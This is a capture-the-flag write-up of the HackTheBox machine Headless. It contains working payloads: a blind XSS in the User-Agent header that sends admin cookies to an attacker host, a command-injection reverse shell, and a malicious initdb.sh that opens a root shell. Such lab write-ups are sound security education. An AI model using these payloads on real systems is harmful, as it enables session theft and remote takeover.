---
title: "HTB Headless: XSS to RCE via Cookie Theft"
date: 2026-02-01
tags: [ctf, security, web, writeup]
summary: "Walkthrough of HackTheBox Headless — exploiting blind XSS in a support form to steal admin cookies, then leveraging command injection for root."
---

Headless is an easy-rated HackTheBox machine that chains blind XSS with command injection. It's a clean example of how a minor client-side vulnerability can escalate to full system compromise.

## Reconnaissance

Nmap reveals two open ports:

```
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Port 5000 serves a Python web application (Werkzeug). The site has a landing page and a `/support` endpoint with a contact form.

## Finding the XSS

The support form has fields for name, email, and message. Submitting normal data returns a confirmation page. Submitting anything with `<script>` tags in the message body triggers a "hacking attempt detected" warning — the input is being filtered.

But the filter only applies to the message field. The **User-Agent header** is reflected in the admin's view of the report without sanitization.

## Blind XSS via User-Agent

The admin periodically reviews submitted support tickets. We can inject JavaScript via the User-Agent header:

```bash
curl -X POST http://target:5000/support \
  -H "User-Agent: <script>fetch('http://attacker:8000/steal?c='+document.cookie)</script>" \
  -d "name=test&email=test@test.com&message=help"
```

After a minute, our listener catches the admin's cookie:

```
GET /steal?c=is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
```

## Accessing the Admin Panel

With the admin cookie, we can access `/dashboard`:

```bash
curl http://target:5000/dashboard \
  -H "Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs"
```

The dashboard has a "Generate Report" function that takes a date parameter.

## Command Injection

The date parameter is passed directly to a shell command. Testing with a simple payload:

```
date=2024-01-01;id
```

Returns `uid=1000(dvir)` in the response. We have command execution.

## Reverse Shell

```bash
date=2024-01-01;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/9001+0>%261'
```

We get a shell as `dvir` and can read `user.txt`.

## Privilege Escalation

`sudo -l` reveals:

```
(ALL) NOPASSWD: /usr/bin/syscheck
```

The `syscheck` script calls another script (`initdb.sh`) using a relative path. By creating a malicious `initdb.sh` in our current directory:

```bash
echo '#!/bin/bash' > initdb.sh
echo 'bash -i >& /dev/tcp/ATTACKER/9002 0>&1' >> initdb.sh
chmod +x initdb.sh
sudo /usr/bin/syscheck
```

Root shell. `root.txt` secured.

## Key Takeaways

- **Input filtering is not security.** The app filtered `<script>` in the message body but ignored HTTP headers. Sanitize all reflected content, regardless of source.
- **Blind XSS is underestimated.** If admin panels render user-controlled data, test for stored/blind XSS in every input vector — headers, filenames, metadata.
- **Relative paths in privileged scripts are dangerous.** Always use absolute paths in scripts that run with elevated privileges.
